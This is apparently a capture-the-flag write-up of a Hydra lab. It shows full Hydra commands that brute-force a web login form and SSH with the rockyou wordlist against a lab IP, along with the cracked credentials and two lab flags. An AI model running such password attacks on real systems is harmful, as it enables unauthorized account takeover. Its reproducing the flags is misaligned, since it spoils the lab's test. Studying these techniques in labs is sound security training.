Step 1: Access the Target
--

Open the target IP in my browser:

http://10.49.145.209

see a login page.

<img width="906" height="861" alt="Screenshot 2026-04-30 181618" src="https://github.com/user-attachments/assets/9dce5e9f-3ee8-49f9-86e9-3586e68d693f" />


Step 2: Initial Login Attempt
--

Tried logging in manually, but got the error:

Your username or password is incorrect.

This indicates that the login form is a good candidate for a brute-force attack.

Step 3: Brute Force Web Login
--

Use Hydra to attack the HTTP POST login form.

Command:
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.49.145.209 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -v
Explanation:
-l molly → username
-P rockyou.txt → password wordlist
http-post-form → specifies login type
F=incorrect → failure message
-v → verbose output

Result
--
Hydra found valid credentials:

[80][http-post-form] host: 10.49.145.209   login: molly   password: sunshine
<img width="817" height="547" alt="Screenshot 2026-04-30 184301" src="https://github.com/user-attachments/assets/6219fa0e-2302-47fb-8a81-b6987003d059" />



Step 4: Login & Capture Flag 1
--
Login to the website using:

Username: molly
Password: sunshine

Flag 1:
THM{2673a7dd116de68e85c48ec0b1f2612e}
<img width="956" height="921" alt="Screenshot 2026-04-30 184630" src="https://github.com/user-attachments/assets/899f9f93-a126-4e0c-96c2-fcf3701be4ba" />


Step 5: Brute Force SSH
--
Next, brute-force the SSH service.

Command:
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.49.145.209 -t4 ssh
Explanation:
ssh → targets SSH service
-t4 → 4 parallel threads (faster attack)
#Result
<img width="938" height="796" alt="Screenshot 2026-04-30 185027" src="https://github.com/user-attachments/assets/f28bfd5a-809e-4b94-87ce-c635cde33cf8" />

Hydra successfully found the SSH credentials and revealed:

THM{c8eeb0468febbadea859baeb33b2541b}
<img width="952" height="177" alt="Screenshot 2026-04-30 185131" src="https://github.com/user-attachments/assets/f4ced0fc-a1e8-4b20-9d28-096328dd6eff" />

